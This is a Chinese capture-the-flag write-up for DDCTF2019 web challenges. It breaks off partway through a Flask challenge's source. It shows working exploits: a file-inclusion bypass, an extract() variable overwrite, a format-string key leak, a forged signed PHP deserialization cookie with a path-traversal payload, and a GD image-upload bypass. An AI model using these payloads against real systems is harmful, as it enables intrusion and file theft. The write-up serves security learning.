<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="f8cbcc29af9c97ecc6f70b8dadad70ee">DDCTF2019</h1>
<p>刚刚结束的ddctf2019，题目质量还是不错的，当然脑洞也不小，也有出题人不谨慎而导致非预期解，下面也会提及。共计23题，完成17题，Android一道没做，re、misc、web都差最后一题，待其他大神发writeup了。</p>
<h2 data-content="1" id="d91301a821389d1d9f1b0f02dca655d1">WEB</h2>
<h3 data-content="1" id="064e543f45ba6fc542a47c7de4872504">滴~</h3>
<p>访问自动跳转到 <a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a> ，页面上显示flag.jpg<br/>
对<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 分析可知为<code>base64_encode(base64_encode('flag.jpg'.encode('hex'))</code></p>
<p>文件包含泄露源码：<code>http://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>，<code>index.php</code>源码如下：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="cm">/*</span>
<span class="cm"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span>
<span class="cm"> * Date: July 4,2018</span>
<span class="cm"> */</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">||</span> <span class="o">~</span><span class="nx">E_NOTICE</span><span class="p">);</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'content-type:text/html;charset=utf-8'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'jpg'</span><span class="p">]))</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span><span class="p">);</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'jpg'</span><span class="p">])));</span>
<span class="k">echo</span> <span class="s1">'&lt;title&gt;'</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'jpg'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/title&gt;'</span><span class="p">;</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/[^a-zA-Z0-9.]+/"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$file</span><span class="o">.</span><span class="s1">'&lt;/br&gt;'</span><span class="p">;</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"config"</span><span class="p">,</span><span class="s2">"!"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$file</span><span class="o">.</span><span class="s1">'&lt;/br&gt;'</span><span class="p">;</span>
<span class="nv">$txt</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>

<span class="k">echo</span> <span class="s2">"&lt;img src='data:image/gif;base64,"</span><span class="o">.</span><span class="nv">$txt</span><span class="o">.</span><span class="s2">"'&gt;&lt;/img&gt;"</span><span class="p">;</span>
<span class="cm">/*</span>
<span class="cm"> * Can you find the flag file?</span>
<span class="cm"> *</span>
<span class="cm"> */</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>代码除了文件包含外，并没有什么漏洞，源码上博客内容是关于shell下echo的一些特殊用法，对于php中的echo并不适用。作者另外一篇博客 <a href="https://blog.csdn.net/fengbanliuyun/article/details/80913909" target="_blank">vim 异常退出 swp文件提示</a> 提到了<code>.practice.txt.swp</code></p>
<p>访问 <code>http://117.51.150.246/practice.txt.swp</code> 得到新的提示<code>f1ag!ddctf.php</code>。</p>
<p>文件包含<code>f1ag!ddctf.php</code>，根据<code>index.php</code>的源代码，我们需要用<code>config</code>替换<code>!</code></p>
<p><a href="http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==" target="_blank">http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</a></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
<span class="nv">$k</span> <span class="o">=</span> <span class="s1">'hello'</span><span class="p">;</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$uid</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nv">$content</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$k</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$uid</span><span class="o">==</span><span class="nv">$content</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s1">'hello'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>存在一个明显的变量覆盖漏洞，覆盖<code>$k</code>为空，同时将<code>$uid</code>也置为空即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133702-fe36480e-619b-1.png"/></p>
<h3 data-content="1" id="9650b3fc9923fc3a1204cb277d1a1f89">Web签到题</h3>
<p>打开 <a href="http://117.51.158.44/index.php" target="_blank">http://117.51.158.44/index.php</a> 后，提示<code>抱歉，您没有登陆权限，请获取权限后访问-----</code>，查看一下源代码，发现有<code>auth()</code></p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"js/jquery.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"js/index.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">hljs</span><span class="p">.</span><span class="nx">initHighlightingOnLoad</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">"auth()"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'center'</span> <span class="na">id</span><span class="o">=</span><span class="s">"auth"</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>


    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</pre></div>
<p>此函数在<code>http://117.51.158.44/js/index.js</code>中</p>
<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">auth</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
        <span class="nx">type</span><span class="o">:</span> <span class="s2">"post"</span><span class="p">,</span>
        <span class="nx">url</span><span class="o">:</span><span class="s2">"http://117.51.158.44/app/Auth.php"</span><span class="p">,</span>
        <span class="nx">contentType</span><span class="o">:</span> <span class="s2">"application/json;charset=utf-8"</span><span class="p">,</span>
        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">"json"</span><span class="p">,</span>
        <span class="nx">beforeSend</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"didictf_username"</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
        <span class="p">},</span>
        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">getdata</span><span class="p">)</span> <span class="p">{</span>
           <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">getdata</span><span class="p">);</span>
           <span class="k">if</span><span class="p">(</span><span class="nx">getdata</span><span class="p">.</span><span class="nx">data</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
               <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'auth'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">getdata</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
           <span class="p">}</span>
        <span class="p">},</span><span class="nx">error</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">){</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">}</span>
</pre></div>
<p>burp抓包发现http包请求确实有个<code>didictf_username</code>字段，修改为<code>didictf_username: admin</code>后成功验证，提示访问<code>app/fL2XID2i0Cdh.php</code></p>
<p><a href="http://117.51.158.44/app/fL2XID2i0Cdh.php" target="_blank">http://117.51.158.44/app/fL2XID2i0Cdh.php</a> 中内容如下：</p>
<p>url:app/Application.php</p>
<div class="highlight"><pre><span></span><span class="x">Class Application {</span>
<span class="x">    var $path = '';</span>


<span class="x">    public function response($data, $errMsg = 'success') {</span>
<span class="x">        $ret = ['errMsg' =&gt; $errMsg,</span>
<span class="x">            'data' =&gt; $data];</span>
<span class="x">        $ret = json_encode($ret);</span>
<span class="x">        header('Content-type: application/json');</span>
<span class="x">        echo $ret;</span>

<span class="x">    }</span>

<span class="x">    public function auth() {</span>
<span class="x">        $DIDICTF_ADMIN = 'admin';</span>
<span class="x">        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {</span>
<span class="x">            $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');</span>
<span class="x">            return TRUE;</span>
<span class="x">        }else{</span>
<span class="x">            $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error');</span>
<span class="x">            exit();</span>
<span class="x">        }</span>

<span class="x">    }</span>
<span class="x">    private function sanitizepath($path) {</span>
<span class="x">    $path = trim($path);</span>
<span class="x">    $path=str_replace('../','',$path);</span>
<span class="x">    $path=str_replace('..\\','',$path);</span>
<span class="x">    return $path;</span>
<span class="x">}</span>

<span class="x">public function __destruct() {</span>
<span class="x">    if(empty($this-&gt;path)) {</span>
<span class="x">        exit();</span>
<span class="x">    }else{</span>
<span class="x">        $path = $this-&gt;sanitizepath($this-&gt;path);</span>
<span class="x">        if(strlen($path) !== 18) {</span>
<span class="x">            exit();</span>
<span class="x">        }</span>
<span class="x">        $this-&gt;response($data=file_get_contents($path),'Congratulations');</span>
<span class="x">    }</span>
<span class="x">    exit();</span>
<span class="x">}</span>
<span class="x">}</span>
</pre></div>
<p>url:app/Session.php</p>
<div class="highlight"><pre><span></span><span class="x">include 'Application.php';</span>
<span class="x">class Session extends Application {</span>

<span class="x">    //key建议为8位字符串</span>
<span class="x">    var $eancrykey                  = '';</span>
<span class="x">    var $cookie_expiration          = 7200;</span>
<span class="x">    var $cookie_name                = 'ddctf_id';</span>
<span class="x">    var $cookie_path                = '';</span>
<span class="x">    var $cookie_domain              = '';</span>
<span class="x">    var $cookie_secure              = FALSE;</span>
<span class="x">    var $activity                   = "DiDiCTF";</span>

<span class="x">    public function index()</span>
<span class="x">    {</span>
<span class="x">    if(parent::auth()) {</span>
<span class="x">            $this-&gt;get_key();</span>
<span class="x">            if($this-&gt;session_read()) {</span>
<span class="x">                $data = 'DiDI Welcome you %s';</span>
<span class="x">                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);</span>
<span class="x">                parent::response($data,'sucess');</span>
<span class="x">            }else{</span>
<span class="x">                $this-&gt;session_create();</span>
<span class="x">                $data = 'DiDI Welcome you';</span>
<span class="x">                parent::response($data,'sucess');</span>
<span class="x">            }</span>
<span class="x">        }</span>
<span class="x">    }</span>

<span class="x">    private function get_key() {</span>
<span class="x">        //eancrykey  and flag under the folder</span>
<span class="x">        $this-&gt;eancrykey =  file_get_contents('../config/key.txt');</span>
<span class="x">    }</span>

<span class="x">    public function session_read() {</span>
<span class="x">        if(empty($_COOKIE)) {</span>
<span class="x">        return FALSE;</span>
<span class="x">        }</span>

<span class="x">        $session = $_COOKIE[$this-&gt;cookie_name];</span>
<span class="x">        if(!isset($session)) {</span>
<span class="x">            parent::response("session not found",'error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        $hash = substr($session,strlen($session)-32);</span>
<span class="x">        $session = substr($session,0,strlen($session)-32);</span>

<span class="x">        if($hash !== md5($this-&gt;eancrykey.$session)) {</span>
<span class="x">            parent::response("the cookie data not match",'error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        $session = unserialize($session);</span>

<span class="x">        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>

<span class="x">        if(!empty($_POST["nickname"])) {</span>
<span class="x">            $arr = array($_POST["nickname"],$this-&gt;eancrykey);</span>
<span class="x">            $data = "Welcome my friend %s";</span>
<span class="x">            foreach ($arr as $k =&gt; $v) {</span>
<span class="x">                $data = sprintf($data,$v);</span>
<span class="x">            }</span>
<span class="x">            parent::response($data,"Welcome");</span>
<span class="x">        }</span>

<span class="x">        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {</span>
<span class="x">            parent::response('the ip addree not match'.'error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {</span>
<span class="x">            parent::response('the user agent not match','error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        return TRUE;</span>
<span class="x">    }</span>

<span class="x">    private function session_create() {</span>
<span class="x">        $sessionid = '';</span>
<span class="x">        while(strlen($sessionid) &lt; 32) {</span>
<span class="x">            $sessionid .= mt_rand(0,mt_getrandmax());</span>
<span class="x">        }</span>

<span class="x">        $userdata = array(</span>
<span class="x">            'session_id' =&gt; md5(uniqid($sessionid,TRUE)),</span>
<span class="x">            'ip_address' =&gt; $_SERVER['REMOTE_ADDR'],</span>
<span class="x">            'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'],</span>
<span class="x">            'user_data' =&gt; '',</span>
<span class="x">        );</span>
<span class="x">        $cookiedata = serialize($userdata);</span>
<span class="x">        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);</span>
<span class="x">        $expire = $this-&gt;cookie_expiration + time();</span>
<span class="x">        setcookie(</span>
<span class="x">            $this-&gt;cookie_name,</span>
<span class="x">            $cookiedata,</span>
<span class="x">            $expire,</span>
<span class="x">            $this-&gt;cookie_path,</span>
<span class="x">            $this-&gt;cookie_domain,</span>
<span class="x">            $this-&gt;cookie_secure</span>
<span class="x">            );</span>
<span class="x">    }</span>
<span class="x">}</span>

<span class="x">$ddctf = new Session();</span>
<span class="x">$ddctf-&gt;index();</span>
</pre></div>
<p>首先留意到<code>class Application</code>中有一个读取文件的地方</p>
<div class="highlight"><pre><span></span><span class="x">public function __destruct() {</span>
<span class="x">        if(empty($this-&gt;path)) {</span>
<span class="x">            exit();</span>
<span class="x">        }else{</span>
<span class="x">            $path = $this-&gt;sanitizepath($this-&gt;path);</span>
<span class="x">            if(strlen($path) !== 18) {</span>
<span class="x">                exit();</span>
<span class="x">            }</span>
<span class="x">            $this-&gt;response($data=file_get_contents($path),'Congratulations');</span>
<span class="x">        }</span>
<span class="x">        exit();</span>
<span class="x">}</span>
</pre></div>
<p>路径要求18位，而<code>../config/flag.txt</code>刚好18位满足要求，基本可以确定flag的位置，<code>sanitizepath</code>会将<code>../</code>替换为空，可直接双写绕过过滤<code>....//config/flag.txt</code>。</p>
<p>然后在<code>class Session</code>中<code>session_read()</code>有反序列化的代码，只要触发反序列化就能到读取文件的地方</p>
<div class="highlight"><pre><span></span><span class="x">$session = $_COOKIE[$this-&gt;cookie_name];</span>
<span class="x">        if(!isset($session)) {</span>
<span class="x">            parent::response("session not found",'error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        $hash = substr($session,strlen($session)-32);</span>
<span class="x">        $session = substr($session,0,strlen($session)-32);</span>

<span class="x">        if($hash !== md5($this-&gt;eancrykey.$session)) {</span>
<span class="x">            parent::response("the cookie data not match",'error');</span>
<span class="x">            return FALSE;</span>
<span class="x">        }</span>
<span class="x">        $session = unserialize($session);</span>
</pre></div>
<p>其中<code>cookie_name</code>为<code>ddctf_id</code>，代码会对session内容进行校验，校验方法为最后32位的hash值，要等于<code>md5($this-&gt;eancrykey.$session)</code>，绕过验证需要泄露<code>$this-&gt;eancrykey</code>的值</p>
<p>留意到<code>session_read()</code>中有一段格式化字符的代码</p>
<div class="highlight"><pre><span></span><span class="x">if(!empty($_POST["nickname"])) {</span>
<span class="x">            $arr = array($_POST["nickname"],$this-&gt;eancrykey);</span>
<span class="x">            $data = "Welcome my friend %s";</span>
<span class="x">            foreach ($arr as $k =&gt; $v) {</span>
<span class="x">                $data = sprintf($data,$v);</span>
<span class="x">            }</span>
<span class="x">            parent::response($data,"Welcome");</span>
<span class="x">        }</span>
</pre></div>
<p>这里for循环会对<code>$data</code>进行两次格式化字符串操作，其中<code>nickname</code>我们可控，若<code>nickname=%s</code>，第二次格式化字符串就能把<code>$this-&gt;eancrykey</code>泄露出来。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133741-15be2bd6-619c-1.png"/></p>
<p>至此，伪造session的信息收集完毕，可以伪造session进行文件读取，代码如下。</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">Class</span> <span class="nc">Application</span> <span class="p">{</span>
    <span class="k">var</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">'....//config/flag.txt'</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Application</span><span class="p">();</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s1">'EzblrbNS'</span><span class="p">;</span>
<span class="nv">$cookie_name</span> <span class="o">=</span> <span class="s1">'ddctf_id'</span><span class="p">;</span>
<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key</span><span class="o">.</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span><span class="nv">$hash</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>将代码生成的payload URL编码后发送</p>
<pre><code>POST /app/Session.php HTTP/1.1
didictf_username: admin
cookie: ddctf_id=O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22....%2F%2Fconfig%2Fflag.txt%22%3B%7D77cd55a8d29df4f005f85e536d876525</code></pre>
<p>发送后得到：<br/>
<code>{"errMsg":"Congratulations","data":"DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}"}</code></p>
<h3 data-content="1" id="ba56778bbedeca05eb18739579501cac">Upload-IMG</h3>
<pre><code>http://117.51.148.166/upload.php

user：dd@ctf
pass：DD@ctf#000</code></pre>
<p>登录后直接上传一张图片，提示未包含<code>phpinfo()</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133835-35678a86-619c-1.png"/></p>
<p>将图片下载下来，winhex打开看了一下，发现文件头有<code>gd-jpeg</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133851-3f2ef2b6-619c-1.png"/></p>
<p>搜索一下发现GD库图片渲染存在漏洞，<a href="https://wiki.ioin.in/soft/detail/1q" target="_blank">https://wiki.ioin.in/soft/detail/1q</a></p>
<p><code>jpg_name.jpg</code>是待GD处理的图片</p>
<pre><code>php jpg_payload.php &lt;jpg_name.jpg&gt;</code></pre>
<p>如提示缺少gd库，可用<code>apt install php-gd</code>安装</p>
<p>网上不少文章提到不一定每张图片都可以成功写入，需要多试几张，而我脸比较黑，试了十多张无果。</p>
<p>绝望之际，拿了群里大佬发的一个表情包，终于成功了，泪目。。。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133806-246e60d8-619c-1.png"/></p>
<h3 data-content="1" id="391309ed7e9eee7106f57a339ac5925d">homebrew event loop</h3>
<p><a href="http://116.85.48.107:5002/d5afe1f66147e857/" target="_blank">http://116.85.48.107:5002/d5afe1f66147e857/</a></p>
<p>题目是一个flask站，并且提供了源码</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span> 
<span class="kn">import</span> <span class="nn">urllib</span> 

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span> 
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">'*********************'</span> <span class="c1"># censored </span>
<span class="n">url_prefix</span> <span class="o">=</span> <span class="s1">'/d5afe1f66147e857'</span> 

<span class="k">def</span> <span class="nf">FLAG</span><span class="p">():</span> 
    <span class="k">return</span> <span class="s1">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="c1"># censored </span>

<span class="k">def</span> <span class="nf">trigger_event</span><span class="p">(</span><span class="n">event</span><span class="p">):</span> 
    <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> 
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">'log'</span><span class="p">][</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span> 
    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="o">==</span> <span class="nb">type</span><span class="p">([]):</span> 
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span> <span class="o">+=</span> <span class="n">event</span> 
    <span class="k">else</span><span class="p">:</span> 
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">get_mid_str</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">postfix</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span> 
    <span class="n">haystack</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">[</span><span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">):]</span> 
    <span class="k">if</span> <span class="n">postfix</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span> 
        <span class="n">haystack</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">[:</span><span class="n">haystack</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">postfix</span><span class="p">)]</span> 
    <span class="k">return</span> <span class="n">haystack</span> 

<span class="k">class</span> <span class="nc">RollBackException</span><span class="p">:</span> <span class="k">pass</span> 

<span class="k">def</span> <span class="nf">execute_event_loop</span><span class="p">():</span> 
    <span class="n">valid_event_chars</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="p">)</span> 
    <span class="n">resp</span> <span class="o">=</span> <span class="bp">None</span> 
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span> 
        <span class="n">event</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" </span>
        <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">event_queue</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> 
        <span class="k">if</span> <span class="ow">not</span> <span class="n">event</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s1">'action:'</span><span class="p">,</span> <span class="s1">'func:'</span><span class="p">)):</span> <span class="k">continue</span> 
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">event</span><span class="p">:</span> 
            <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">valid_event_chars</span><span class="p">:</span> <span class="k">break</span> 
        <span class="k">else</span><span class="p">:</span> 
            <span class="n">is_action</span> <span class="o">=</span> <span class="n">event</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'a'</span> 
            <span class="n">action</span> <span class="o">=</span> <span class="n">get_mid_str</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="s1">':'</span><span class="p">,</span> <span class="s1">';'</span><span class="p">)</span> 
            <span class="n">args</span> <span class="o">=</span> <span class="n">get_mid_str</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">action</span><span class="o">+</span><span class="s1">';'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'#'</span><span class="p">)</span> 
            <span class="k">try</span><span class="p">:</span> 
                <span class="n">event_handler</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">action</span> <span class="o">+</span> <span class="p">(</span><span class="s1">'_handler'</span> <span class="k">if</span> <span class="n">is_action</span> <span class="k">else</span> <span class="s1">'_function'</span><span class="p">))</span> 
                <span class="n">ret_val</span> <span class="o">=</span> <span class="n">event_handler</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> 
            <span class="k">except</span> <span class="n">RollBackException</span><span class="p">:</span> 
                <span class="k">if</span> <span class="n">resp</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span> <span class="n">resp</span> <span class="o">=</span> <span class="s1">''</span> 
                <span class="n">resp</span> <span class="o">+=</span> <span class="s1">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span> 
                <span class="n">resp</span> <span class="o">+=</span> <span class="s1">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> 
                <span class="n">session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">prev_session</span><span class="p">[</span><span class="s1">'num_items'</span><span class="p">]</span> 
                <span class="n">session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">prev_session</span><span class="p">[</span><span class="s1">'points'</span><span class="p">]</span> 
                <span class="k">break</span> 
            <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span> 
                <span class="k">if</span> <span class="n">resp</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span> <span class="n">resp</span> <span class="o">=</span> <span class="s1">''</span> 
                <span class="c1">#resp += str(e) # only for debugging </span>
                <span class="k">continue</span> 
            <span class="k">if</span> <span class="n">ret_val</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span> 
                <span class="k">if</span> <span class="n">resp</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">ret_val</span> 
                <span class="k">else</span><span class="p">:</span> <span class="n">resp</span> <span class="o">+=</span> <span class="n">ret_val</span> 
